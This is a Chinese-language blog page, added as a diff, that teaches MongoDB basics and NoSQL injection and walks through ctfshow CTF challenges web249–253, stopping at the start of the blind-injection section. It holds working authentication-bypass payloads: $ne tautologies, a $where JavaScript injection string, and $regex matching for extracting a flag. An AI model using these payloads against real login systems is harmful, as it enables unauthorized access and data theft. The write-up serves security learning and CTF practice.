@@ -1,0 +1,601 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>NoSQL注入 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">2.</span> <span class="toc-text">基础语法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.1.</span> <span class="toc-text">数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9B%86%E5%90%88"><span class="toc-number">2.2.</span> <span class="toc-text">集合</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E6%A1%A3"><span class="toc-number">2.3.</span> <span class="toc-text">文档</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PHP%E6%93%8D%E4%BD%9CMongoDB"><span class="toc-number">3.</span> <span class="toc-text">PHP操作MongoDB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text">注入分类</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E8%A8%80%E5%BC%8F%E6%B3%A8%E5%85%A5"><span class="toc-number">4.1.</span> <span class="toc-text">重言式注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">4.2.</span> <span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript%E6%B3%A8%E5%85%A5-x2F-where%E6%B3%A8%E5%85%A5"><span class="toc-number">4.3.</span> <span class="toc-text">JavaScript注入&#x2F;$where注入</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%AE%9E%E6%88%98"><span class="toc-number">5.</span> <span class="toc-text">题目实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web249%EF%BC%88memcache%EF%BC%89"><span class="toc-number">5.1.</span> <span class="toc-text">ctfshow web249（memcache）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web250%EF%BC%88%E6%B0%B8%E7%9C%9F%E5%BC%8F%EF%BC%89"><span class="toc-number">5.2.</span> <span class="toc-text">ctfshow web250（永真式）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web251"><span class="toc-number">5.3.</span> <span class="toc-text">ctfshow web251</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web252%EF%BC%88%E6%AD%A3%E5%88%99%EF%BC%89"><span class="toc-number">5.4.</span> <span class="toc-text">ctfshow web252（正则）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfshow-web253%EF%BC%88%E7%9B%B2%E6%B3%A8%EF%BC%89"><span class="toc-number">5.5.</span> <span class="toc-text">ctfshow web253（盲注）</span></a></li></ol></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>NoSQL注入</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/8/20
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Sql/" style="color: #03a9f4">Sql</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/ctfshow/" style="color: #03a9f4">ctfshow</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.3k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">5分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><a target="_blank" rel="noopener" href="https://www.runoob.com/mongodb/nosql.html">菜鸟教程 nosql</a></p>
+<p>ctfshow web249-253</p>
+<p>参考：<a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB">http://www.mi1k7ea.com/2019/08/11/NoSQL%E6%B3%A8%E5%85%A5%E4%B9%8BMongoDB</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><p>使用docker上的MongoDB 7.0.0进行测试</p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>创建&#x2F;切换数据库</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">use</span> <span class="token keyword">user</span>
+db<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>查看所有数据库</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>插入数据</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span><span class="token keyword">user</span><span class="token punctuation">.</span>insertOne<span class="token punctuation">(</span>&#123;<span class="token string">"name"</span>:<span class="token string">"C1oudfL0w0"</span>&#125;<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>MongoDB 中默认的数据库为 test，如果你没有创建新的数据库，集合将存放在 test 数据库中</p>
+<p><img src="/blog/2023/08/20/NoSQL%E6%B3%A8%E5%85%A5/image-20230820181407534.png" alt="image-20230820181407534"></p>
+<p>删除数据库</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>dropDatabase<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><p>对应MySQL中的表</p>
+<p>创建集合</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>createCollection<span class="token punctuation">(</span>name<span class="token punctuation">,</span> options<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<ul>
+<li>name: 要创建的集合名称</li>
+<li>options: 可选参数，指定有关内存大小及索引的选项，可选<code>capped</code>、<code>size</code>、<code>max</code>、<code>autoIndexId</code>（3.2 之后不再支持该参数）</li>
+</ul>
+<p>查看已有集合</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> collections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/20/NoSQL%E6%B3%A8%E5%85%A5/image-20230820182705287.png" alt="image-20230820182705287"></p>
+<hr>
+<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>document，对应MySQL的row</p>
+<p>插入文档</p>
+<p><code>insert()</code>方法</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>COLLECTION_NAME<span class="token punctuation">.</span><span class="token keyword">insert</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>若插入的数据主键已经存在，则会抛出 <strong>org.springframework.dao.DuplicateKeyException</strong> 异常，提示主键重复，不保存当前数据。</p>
+<p><code>save()</code>方法</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>COLLECTION_NAME<span class="token punctuation">.</span><span class="token keyword">save</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>如果 _id 主键存在则更新数据，如果不存在就插入数据。该方法新版本中已废弃，可以使用 <code>db.collection.insertOne()</code> 或 <code>db.collection.replaceOne() </code>来代替。</p>
+<p>实例：</p>
+<p>插入文档</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>col<span class="token punctuation">.</span><span class="token keyword">insert</span><span class="token punctuation">(</span>&#123;username: <span class="token string">'C1oudfL0w0'</span><span class="token punctuation">,</span> password: <span class="token string">'ahaha'</span><span class="token punctuation">,</span><span class="token keyword">level</span>: <span class="token number">100</span> &#125;<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查看文档</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>col<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2023/08/20/NoSQL%E6%B3%A8%E5%85%A5/image-20230820183359608.png" alt="image-20230820183359608"></p>
+<hr>
+<h1 id="PHP操作MongoDB"><a href="#PHP操作MongoDB" class="headerlink" title="PHP操作MongoDB"></a>PHP操作MongoDB</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$mongo</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">MongoClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token variable">$mongo</span><span class="token operator">-></span><span class="token property">myinfo</span><span class="token punctuation">;</span> <span class="token comment">//选择数据库</span>
+<span class="token variable">$coll</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-></span><span class="token property">test</span><span class="token punctuation">;</span> <span class="token comment">//选择集合</span>
+<span class="token variable">$coll</span><span class="token operator">-></span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//增</span>
+<span class="token variable">$coll</span><span class="token operator">-></span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//查</span>
+<span class="token variable">$coll</span><span class="token operator">-></span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//减</span>
+<span class="token variable">$coll</span><span class="token operator">-></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//改</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="注入分类"><a href="#注入分类" class="headerlink" title="注入分类"></a>注入分类</h1><h2 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a>重言式注入</h2><p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制</p>
+<p>万能密码：<code>username[$ne]=1&amp;password[$ne]=1</code></p>
+<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>联合查询是一种众所周知的SQL注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据</p>
+<h2 id="JavaScript注入-x2F-where注入"><a href="#JavaScript注入-x2F-where注入" class="headerlink" title="JavaScript注入&#x2F;$where注入"></a>JavaScript注入&#x2F;$where注入</h2><p>这是一种新的漏洞，由允许执行数据内容中JavaScript的NoSQL数据库引入的。JavaScript使在数据引擎进行复杂事务和查询成为可能。传递不干净的用户输入到这些查询中可以注入任意JavaScript代码，这会导致非法的数据获取或篡改</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">username<span class="token operator">=</span>test<span class="token operator">&amp;</span>password<span class="token operator">=</span>a<span class="token string">';return true;var c='</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<hr>
+<h1 id="题目实战"><a href="#题目实战" class="headerlink" title="题目实战"></a>题目实战</h1><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/125220318?ops_request_misc=&request_id=4ebaa5cb9e74494eb60062c40617ff22&biz_id=&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~koosearch~default-3-125220318-null-null.268%5Ev1%5Econtrol&utm_term=sql&spm=1018.2226.3001.4450">羽师傅的博客</a></p>
+<h2 id="ctfshow-web249（memcache）"><a href="#ctfshow-web249（memcache）" class="headerlink" title="ctfshow web249（memcache）"></a>ctfshow web249（memcache）</h2><p>查询语句</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token variable">$memcache</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>是Memcache缓存数据库，相关的php语法：</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$m</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">;</span>             <span class="token comment">//创建一个memcache对象</span>
+<span class="token variable">$m</span><span class="token operator">-></span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span> <span class="token number">11451</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//连接Memcached服务器</span>
+<span class="token variable">$m</span><span class="token operator">-></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'test'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置一个变量到内存中，名称是key值是test</span>
+<span class="token variable">$get_value</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//从内存中取出key的值</span>
+<span class="token variable">$m</span><span class="token operator">-></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>那么很明显就是从<code>get</code>方法入手</p>
+<p><img src="/blog/2023/08/20/NoSQL%E6%B3%A8%E5%85%A5/image-20230820184240507.png" alt="image-20230820184240507"></p>
+<p><img src="/blog/2023/08/20/NoSQL%E6%B3%A8%E5%85%A5/image-20230820184257227.png" alt="image-20230820184257227"></p>
+<p>向<code>get</code>中传入参数或者数组，就可以返回指定的键值对</p>
+<p>所以直接查询即可（题目好像不能直接传入参数只能传数组）</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<hr>
+<h2 id="ctfshow-web250（永真式）"><a href="#ctfshow-web250（永真式）" class="headerlink" title="ctfshow web250（永真式）"></a>ctfshow web250（永真式）</h2><p>查询语句</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">MongoDB<span class="token punctuation">\</span>Driver<span class="token punctuation">\</span>Query</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$cursor</span> <span class="token operator">=</span> <span class="token variable">$manager</span><span class="token operator">-></span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ctfshow.ctfshow_user'</span><span class="token punctuation">,</span> <span class="token variable">$query</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>没有过滤</p>
+<p>是MongoDB数据库注入，对应的基本语法：</p>
+<table>
+<thead>
+<tr>
+<th><strong>SQL术语&#x2F;概念</strong></th>
+<th><strong>MongoDB术语&#x2F;概念</strong></th>
+<th><strong>解释&#x2F;说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>database</td>
+<td>database</td>
+<td>数据库</td>
+</tr>
+<tr>
+<td>table</td>
+<td>collection</td>
+<td>数据库表&#x2F;集合</td>
+</tr>
+<tr>
+<td>row</td>
+<td>document</td>
+<td>数据记录行&#x2F;文档</td>
+</tr>
+<tr>
+<td>column</td>
+<td>field</td>
+<td>数据字段&#x2F;域</td>
+</tr>
+</tbody></table>
+<p>重点还是MongoDB的条件语句</p>
+<table>
+<thead>
+<tr>
+<th>操作</th>
+<th>格式</th>
+<th>范例</th>
+<th>RDBMS中的类似语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>等于</td>
+<td>{:}</td>
+<td>db.userinfo.find({“name”:“C1oudfL0w0”})</td>
+<td>where name &#x3D; ‘C1oudfL0w0’</td>
+</tr>
+<tr>
+<td>小于</td>
+<td>{:{$lt:}}</td>
+<td>db.userinfo.find({“age”:{$lt:20}})</td>
+<td>where age &lt; 20</td>
+</tr>
+<tr>
+<td>小于或等于</td>
+<td>{:{$lte:}}</td>
+<td>db.userinfo.find({“age”:{$lte:20}})</td>
+<td>where age &lt;&#x3D; 20</td>
+</tr>
+<tr>
+<td>大于</td>
+<td>{:{$gt:}}</td>
+<td>db.userinfo.find({“age”:{$gt:20}})</td>
+<td>where age &gt; 20</td>
+</tr>
+<tr>
+<td>大于或等于</td>
+<td>{:{$gte:}}</td>
+<td>db.userinfo.find({“age”:{$gte:20}})</td>
+<td>where age &gt;&#x3D; 20</td>
+</tr>
+<tr>
+<td>不等于</td>
+<td>{:{$ne:}}</td>
+<td>db.userinfo.find({“likes”:{$ne:20}})</td>
+<td>where age !&#x3D; 20</td>
+</tr>
+</tbody></table>
+<p>AND 查询</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;key1:value1<span class="token punctuation">,</span> key2:value2&#125;<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>OR 查询</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;$<span class="token operator">or</span>: <span class="token punctuation">[</span>&#123;key1: value1&#125;<span class="token punctuation">,</span> &#123;key2:value2&#125;<span class="token punctuation">]</span>&#125;<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>查询，类似于 <code>where username=&#39;C1oudfL0w0&#39;</code>，其中userinfo是集合名</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;name:<span class="token string">'C1oudfL0w0'</span>&#125;<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>而在条件语句中有一句可以利用的是</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db<span class="token punctuation">.</span>userinfo<span class="token punctuation">.</span>find<span class="token punctuation">(</span>&#123;<span class="token string">"likes"</span>:&#123;$ne:<span class="token number">20</span>&#125;&#125;<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>即 <code>where likes != 20</code>，这个式子一定是永真的</p>
+<p>所以回到题目</p>
+<p>我们传入<code> username[$ne]=1&amp;password[$ne]=1</code>，等价于<code>where username!=1&amp;password!=1</code></p>
+<p>即可实现永真</p>
+<hr>
+<h2 id="ctfshow-web251"><a href="#ctfshow-web251" class="headerlink" title="ctfshow web251"></a>ctfshow web251</h2><p>上一题的payload打进去即可</p>
+<hr>
+<h2 id="ctfshow-web252（正则）"><a href="#ctfshow-web252（正则）" class="headerlink" title="ctfshow web252（正则）"></a>ctfshow web252（正则）</h2><p>查询语句</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">db<span class="token operator">.</span>ctfshow_user<span class="token operator">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>username<span class="token punctuation">:</span><span class="token string single-quoted-string">'$username'</span><span class="token punctuation">,</span><span class="token argument-name">password</span><span class="token punctuation">:</span><span class="token string single-quoted-string">'$password'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">pretty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>pretty()</code>函数纯美化，所以查询语句根本没变</p>
+<p>用之前的payload打发现这题flag不在admin下了，应该是在其它条目里</p>
+<p>这里就需要用到正则匹配了，用<code>^</code>查找以什么为开头的字段</p>
+<p><code> username[$ne]=1&amp;password[$regex]=^ctfshow&#123;</code></p>
+<hr>
+<h2 id="ctfshow-web253（盲注）"><a href="#ctfshow-web253（盲注）" class="headerlink" title="ctfshow web253（盲注）"></a>ctfshow web253（盲注）</h2><p>上题的payload能登录成功，但是不回显查询内容了</p>
